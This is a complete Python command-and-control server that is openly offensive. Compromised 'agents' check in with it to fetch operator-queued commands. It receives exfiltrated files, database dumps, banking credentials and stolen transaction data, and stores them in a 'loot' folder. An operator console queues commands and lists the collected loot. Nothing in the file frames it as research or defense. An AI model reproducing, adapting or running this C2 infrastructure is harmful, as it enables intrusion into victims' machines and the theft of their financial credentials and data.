#!/usr/bin/env python3
import http.server
import socketserver
import json
import base64
import datetime
import os
import threading
import time

# Configuration
PORT = 8080
LOOT_DIR = "loot"
COMMANDS_FILE = "commands.json"

# Initialize
if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)

# Initialize commands
if not os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE, "w") as f:
        json.dump({"commands": []}, f)

class C2Handler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
    def log_message(self, format, *args):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {format % args}")
        
    def do_GET(self):
        self._set_headers()
        # Client checking in for commands
        with open(COMMANDS_FILE, "r") as f:
            commands = json.load(f)
        self.wfile.write(json.dumps(commands).encode())
        print(f"[+] Agent checked in from {self.client_address[0]}")
        
    def do_POST(self):
        self._set_headers()
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            data = json.loads(post_data.decode('utf-8'))
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if 'hostname' in data:
                hostname = data['hostname']
                username = data.get('username', 'unknown')
                print(f"[+] New agent checking in: {hostname} ({username}) from {self.client_address[0]}")
                
                # Save agent info
                with open(f"{LOOT_DIR}/agent_{hostname}_{timestamp}.json", "w") as f:
                    json.dump(data, f, indent=4)
                    
            elif 'file_data' in data:
                # Handle file exfiltration
                filename = data.get('filename', f'unknown_file_{timestamp}')
                print(f"[+] Received file: {filename} from {self.client_address[0]}")
                
                # Decode and save the file
                file_data = base64.b64decode(data['file_data'])
                with open(f"{LOOT_DIR}/{filename}_{timestamp}", "wb") as f:
                    f.write(file_data)
                    
            elif 'db_dump' in data:
                # Handle database dump
                print(f"[+] Received database dump from {self.client_address[0]}")
                with open(f"{LOOT_DIR}/db_dump_{timestamp}.json", "w") as f:
                    json.dump(data['db_dump'], f, indent=4)
                    
            elif 'bank_credentials' in data:
                # Handle banking credentials
                print(f"[+] Received banking credentials from {self.client_address[0]}")
                with open(f"{LOOT_DIR}/bank_creds_{timestamp}.json", "w") as f:
                    json.dump(data['bank_credentials'], f, indent=4)
                    
            elif 'transaction_data' in data:
                # Handle stolen transaction data
                print(f"[+] Received transaction data from {self.client_address[0]}")
                with open(f"{LOOT_DIR}/transactions_{timestamp}.json", "w") as f:
                    json.dump(data['transaction_data'], f, indent=4)
            
            # Send acknowledgment
            response = {'status': 'success'}
            
        except Exception as e:
            print(f"[-] Error processing data: {e}")
            response = {'status': 'error', 'message': str(e)}
            
        self.wfile.write(json.dumps(response).encode())

def run_server():
    with socketserver.TCPServer(("", PORT), C2Handler) as httpd:
        print(f"C2 Server running at port {PORT}")
        httpd.serve_forever()

def command_interface():
    print("Command interface - Type 'help' for commands")
    while True:
        cmd = input("> ").strip().lower()
        if cmd == "help":
            print("Commands:")
            print("  list       - List all available commands")
            print("  add <cmd>  - Add a new command for agents")
            print("  clear      - Clear all commands")
            print("  loot       - List all collected loot")
            print("  exit       - Exit the command interface (server continues)")
        elif cmd == "list":
            with open(COMMANDS_FILE, "r") as f:
                commands = json.load(f)
            print("Current commands:")
            for i, c in enumerate(commands["commands"]):
                print(f"  {i+1}. {c}")
        elif cmd.startswith("add "):
            new_cmd = cmd[4:]
            with open(COMMANDS_FILE, "r") as f:
                commands = json.load(f)
            commands["commands"].append(new_cmd)
            with open(COMMANDS_FILE, "w") as f:
                json.dump(commands, f)
            print(f"Added command: {new_cmd}")
        elif cmd == "clear":
            with open(COMMANDS_FILE, "w") as f:
                json.dump({"commands": []}, f)
            print("Cleared all commands")
        elif cmd == "loot":
            files = os.listdir(LOOT_DIR)
            if files:
                print("Collected loot:")
                for f in files:
                    size = os.path.getsize(os.path.join(LOOT_DIR, f))
                    print(f"  {f} ({size} bytes)")
            else:
                print("No loot collected yet")
        elif cmd == "exit":
            break
        else:
            print("Unknown command. Type 'help' for a list of commands.")

if __name__ == "__main__":
    # Start the server in a background thread
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    # Run the command interface
    try:
        command_interface()
    except KeyboardInterrupt:
        print("\nShutting down...")
